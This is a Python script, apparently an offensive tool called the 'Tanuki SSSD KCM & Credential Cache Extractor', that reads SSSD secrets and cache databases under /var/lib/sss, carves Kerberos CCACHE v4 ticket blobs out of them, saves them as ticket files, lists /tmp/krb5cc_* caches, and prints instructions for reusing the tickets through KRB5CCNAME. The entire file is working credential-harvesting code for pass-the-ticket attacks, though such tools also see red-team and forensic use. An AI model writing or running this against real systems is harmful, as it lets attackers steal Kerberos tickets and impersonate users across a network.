#!/usr/bin/env python3
"""Parse SSSD KCM databases (secrets.ldb) and reconstruct standard CCACHE v4 files."""

import argparse
import glob
import io
import os
import re
import struct
import sys
from typing import List, Tuple

CCACHE_MAGIC_V4 = b"\x05\x04"


def scan_for_ccache_blobs(data: bytes) -> List[Tuple[int, bytes]]:
    """Scan raw binary data for valid CCACHE v4 streams."""
    results = []
    offset = 0
    while True:
        pos = data.find(CCACHE_MAGIC_V4, offset)
        if pos == -1:
            break
        try:
            if pos + 4 <= len(data):
                (header_len,) = struct.unpack(">H", data[pos + 2 : pos + 4])
                if header_len >= 0 and pos + 4 + header_len < len(data):
                    candidate = data[pos : pos + min(65536, len(data) - pos)]
                    results.append((pos, candidate))
        except struct.error:
            pass
        offset = pos + 2
    return results


def triage_local_caches(out_dir: str) -> None:
    os.makedirs(out_dir, exist_ok=True)
    found_any = False

    secrets_paths = [
        "/var/lib/sss/secrets/secrets.ldb",
        "/var/lib/sss/db/cache_*.ldb",
    ]

    print("[*] Phase 1: Scanning SSSD KCM database stores...")
    for pattern in secrets_paths:
        for path in glob.glob(pattern):
            if not os.path.isfile(path):
                continue
            try:
                with open(path, "rb") as f:
                    content = f.read()
                blobs = scan_for_ccache_blobs(content)
                for idx, (_, blob) in enumerate(blobs, 1):
                    base_name = os.path.splitext(os.path.basename(path))[0]
                    dest = os.path.join(out_dir, f"{base_name}_recovered_{idx}.ccache")
                    with open(dest, "wb") as out_f:
                        out_f.write(blob)
                    print(f"  [+] Recovered KCM ticket blob -> {dest}")
                    found_any = True
            except PermissionError:
                print(f"  [-] Access denied to {path} (run with appropriate read rights)")
            except Exception as e:
                print(f"  [-] Error parsing {path}: {e}")

    print("\n[*] Phase 2: Scanning traditional file-based credential caches...")
    tmp_ccaches = glob.glob("/tmp/krb5cc_*")
    for cc in tmp_ccaches:
        print(f"  [+] Discovered active file ccache: {cc}")
        found_any = True

    if not found_any:
        print("  [-] No unencrypted ccache blobs discovered in evaluated paths.")
    else:
        print(
            f"\n[+] Set environment to utilize recovered ticket:\n    $ export KRB5CCNAME={out_dir}/<ticket>.ccache"
        )


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Tanuki SSSD KCM & Credential Cache Extractor"
    )
    parser.add_argument(
        "-f", "--file", help="Specific LDB database file to extract from"
    )
    parser.add_argument(
        "-o",
        "--out",
        default="./extracted_ccache",
        help="Directory to store recovered .ccache files",
    )
    args = parser.parse_args()

    if args.file:
        if not os.path.exists(args.file):
            sys.stderr.write(f"File not found: {args.file}\n")
            sys.exit(1)
        os.makedirs(args.out, exist_ok=True)
        with open(args.file, "rb") as f:
            data = f.read()
        blobs = scan_for_ccache_blobs(data)
        print(f"[*] Found {len(blobs)} candidate ccache streams in {args.file}")
        for idx, (_, b) in enumerate(blobs, 1):
            out_path = os.path.join(args.out, f"ticket_{idx}.ccache")
            with open(out_path, "wb") as out_f:
                out_f.write(b)
            print(f"    -> Saved {out_path}")
    else:
        triage_local_caches(args.out)


if __name__ == "__main__":
    main()
